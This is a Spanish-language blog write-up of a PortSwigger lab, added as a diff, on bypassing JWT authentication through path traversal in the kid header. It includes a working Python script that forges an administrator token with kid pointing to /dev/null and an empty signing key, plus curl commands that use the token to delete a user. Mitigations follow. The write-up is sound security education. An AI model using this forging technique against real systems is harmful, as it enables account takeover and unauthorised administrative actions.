@@ -1,0 +1,202 @@
+---
+title: "Bypass de Autenticación JWT mediante Path Traversal en el Header kid"
+description: "Cómo explotar una vulnerabilidad de path traversal en el parámetro kid del header JWT para forjar tokens de administrador apuntando la búsqueda de claves a /dev/null."
+labUrl: "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal"
+category: "JWT"
+date: "2025-03-13"
+portswiggerDescription: "Este lab utiliza un mecanismo basado en JWT para gestionar sesiones. Para verificar la firma, el servidor usa el parámetro kid en el header JWT para obtener la clave relevante de su sistema de archivos. Para resolver el lab, forja un JWT que te dé acceso al panel de administración en /admin, luego elimina al usuario carlos. Puedes iniciar sesión con tus propias credenciales: wiener:peter"
+lang: "es"
+---
+
+import CollapsiblePartial from '../../../components/CollapsiblePartial.astro';
+import PartialContainer from '../../../components/PartialContainer.astro';
+
+## Conceptos Previos Necesarios Para Resolver El Lab
+
+<PartialContainer>
+  <CollapsiblePartial partial="whats-jwt" title="Fundamentos de JWT" lang="es" />
+  <CollapsiblePartial partial="jwt-kid-path-traversal" title="JWT kid Header y Path Traversal" lang="es" />
+</PartialContainer>
+
+## Resolución
+
+Exploremos la página de login del lab directamente e iniciemos sesión para obtener un token JWT de sesión válido:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/login" | cat
+```
+
+> **Desglose del comando**: \
+`-s` = modo silencioso (sin barra de progreso) \
+`| cat` = redirigir la respuesta a mi <a href="https://github.com/echoesofwhoami/echoes-bat-theme" target="_blank">comando cat personalizado</a> para maximizar la salida gigachad
+
+La página de login tiene un formulario simple con un token CSRF:
+
+```html
+<form class=login-form method=POST action="/login">
+    <input required type="hidden" name="csrf" value="jZEVDXEhHL3f8X18WduPNbFU266yB8PE">
+    <label>Username</label>
+    <input required type=username name="username" autofocus>
+    <label>Password</label>
+    <input required type=password name="password">
+    <button class=button type=submit> Log in </button>
+</form>
+```
+
+Iniciemos sesión con las credenciales proporcionadas:
+
+```bash
+curl -D - "https://<lab-url>.web-security-academy.net/login" -d "csrf=jZEVDXEhHL3f8X18WduPNbFU266yB8PE&username=wiener&password=peter"
+```
+
+> **Desglose del comando**: \
+`-D -` = mostrar cabeceras de respuesta en stdout \
+`-d "csrf=...&username=wiener&password=peter"` = enviar datos POST (automáticamente establece el método a POST y Content-Type a application/x-www-form-urlencoded)
+
+Respuesta:
+
+```
+HTTP/2 302 
+location: /my-account?id=wiener
+set-cookie: session=eyJraWQiOiJkYWRlMTg2ZC02ZDE5LTQ1ODQtYWIyNy03Mzc5NzVlMTYxMWYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQwMTg5NCwic3ViIjoid2llbmVyIn0.whMw5vTopqo88l65CSzqHS4F_YMCnfOPtJBCwH9CPw4; Secure; HttpOnly; SameSite=None
+```
+
+La cookie de sesión es un token JWT. Decodifiquémoslo para entender su estructura:
+
+```bash
+echo "eyJraWQiOiJkYWRlMTg2ZC02ZDE5LTQ1ODQtYWIyNy03Mzc5NzVlMTYxMWYiLCJhbGciOiJIUzI1NiJ9" | base64 -d | jq . | cat
+```
+
+> **Desglose del comando**: \
+`echo "..."` = imprimir la parte del header del JWT \
+`base64 -d` = decodificar base64 \
+`jq .` = formatear JSON \
+`cat` = <a href="https://github.com/echoesofwhoami/echoes-bat-theme" target="_blank">maximizar la salida gigachad</a>
+
+Salida del header:
+
+```json
+{
+  "kid": "dade186d-6d19-4584-ab27-737975e1611f",
+  "alg": "HS256"
+}
+```
+
+Ahora decodifiquemos el payload:
+
+```bash
+echo "eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQwMTg5NCwic3ViIjoid2llbmVyIn0" | base64 -d | jq .
+```
+
+Salida del payload:
+
+```json
+{
+  "iss": "portswigger",
+  "exp": 1773401894,
+  "sub": "wiener"
+}
+```
+
+El JWT usa **HS256** (HMAC-SHA256) para la firma e incluye un parámetro `kid` (Key ID) en el header. Según la descripción del lab, el servidor usa este parámetro `kid` para obtener la clave de firma relevante **de su sistema de archivos**. Este es el detalle crítico. Si el valor de `kid` se usa para construir una ruta de archivo sin la sanitización adecuada, podemos explotar una vulnerabilidad de **path traversal**.
+
+La idea es simple: apuntar `kid` a `/dev/null` mediante una secuencia de path traversal. Como `/dev/null` devuelve contenido vacío, el servidor usará una **cadena vacía** como clave de firma. Entonces podemos forjar un JWT firmado con esa misma cadena vacía.
+
+Creemos un script de Python para forjar el JWT de administrador:
+
+```python
+import hmac
+import hashlib
+import base64
+
+# Transforms string to base64 string
+def b64(string): return base64.urlsafe_b64encode(string).decode().rstrip('=')
+
+# Forge header with kid pointing to /dev/null via path traversal
+header = '{"kid":"../../../../../../../dev/null","alg":"HS256"}'
+
+# Forge payload with sub=administrator
+payload = '{"iss":"portswigger","exp":1773401894,"sub":"administrator"}'
+
+# Put together the message part of the JWT
+message = f"{b64(header.encode())}.{b64(payload.encode())}"
+
+# Sign with empty string (the content of /dev/null)
+signature = b64(hmac.new(b'', message.encode(), hashlib.sha256).digest())
+
+forged_jwt = f"{message}.{signature}"
+
+print(forged_jwt)
+```
+
+> **Desglose del script**: \
+> El script forja un JWT de administrador:
+> 1. **Crea el header** con `kid` apuntando a `../../../../../../../dev/null` usando path traversal para apuntar a un archivo con contenido vacío
+> 2. **Crea el payload** con `"sub": "administrator"` para suplantar al administrador
+> 3. **Firma el JWT** con una **cadena vacía** (`b''`) como clave HMAC-SHA256, coincidiendo con lo que el servidor leerá de `/dev/null`
+> 4. **Ensambla** header, payload y firma en un JWT completo
+
+Salida esperada:
+
+```
+eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQwMTg5NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.0CPsUNxkYuo09m3xARyLb-_wJs-1KYsKS6rTcIxxT_o
+```
+
+Verifiquemos decodificando el header forjado:
+
+```bash
+echo "eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0" | base64 -d | jq .
+```
+
+Salida:
+
+```json
+{
+  "kid": "../../../../../../../dev/null",
+  "alg": "HS256"
+}
+```
+
+Ahora accedamos al panel de administración con nuestro JWT forjado:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/admin" \
+  -b "session=eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQwMTg5NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.0CPsUNxkYuo09m3xARyLb-_wJs-1KYsKS6rTcIxxT_o" \
+  | grep "carlos"
+```
+
+> **Desglose del comando**: \
+`-b "session=..."` = enviar el JWT forjado como cookie de sesión \
+`grep "carlos"` = mostrar líneas que contienen "carlos"
+
+Respuesta:
+
+```html
+<span>carlos - </span>
+<a href="/admin/delete?username=carlos">Delete</a>
+```
+
+Tenemos acceso de administrador. Ahora eliminemos al usuario carlos:
+
+```bash
+curl -s "https://<lab-url>.web-security-academy.net/admin/delete?username=carlos" \
+  -b "session=eyJraWQiOiIuLi8uLi8uLi8uLi8uLi8uLi8uLi9kZXYvbnVsbCIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MzQwMTg5NCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.0CPsUNxkYuo09m3xARyLb-_wJs-1KYsKS6rTcIxxT_o"
+```
+
+El path traversal a través de `kid` nos permitió **anular la clave de firma y forjar un token de administrador**, dominando absolutamente el sistema de autenticación y erradicando a carlos como un verdadero <a href="https://github.com/echoesofwhoami/echoes-bat-theme" target="_blank">gigachad</a>.
+
+## Estrategias de Mitigación
+
+1. **Sanitizar el parámetro `kid`**: Nunca uses el valor de `kid` directamente en operaciones del sistema de archivos. Elimina secuencias de path traversal (`../`) y valida contra una whitelist de identificadores de clave conocidos
+2. **Usar un almacén de claves en lugar del sistema de archivos**: Busca las claves de firma en una base de datos o servicio dedicado de gestión de claves en lugar de leer archivos del disco
+3. **Validar los claims del JWT del lado del servidor**: Siempre verifica el emisor (`iss`), expiración (`exp`) y otros claims independientemente de la verificación de firma
+4. **Usar algoritmos asimétricos**: Considera RS256 o ES256 en lugar de HS256. Con algoritmos asimétricos, la clave de firma (privada) nunca se deriva de entrada controlada por el usuario
+5. **Restringir el acceso a archivos de claves**: Si la búsqueda de claves basada en el sistema de archivos es inevitable, asegúrate de que el proceso se ejecute con permisos mínimos y las claves se almacenen en un directorio dedicado y aislado
+
+## Referencias
+
+**`kid` (Key ID)\*** es un parámetro opcional del header JWT definido en [RFC 7515 Sección 4.1.4](https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.4). Es una pista que indica qué clave se usó para asegurar el JWS (JSON Web Signature).
+
+## Recursos
+
+[JWT.io Debugger](https://jwt.io/) Esta es una herramienta interactiva para decodificar, verificar y depurar tokens JWT. También me fue útil cuando era desarrollador web.
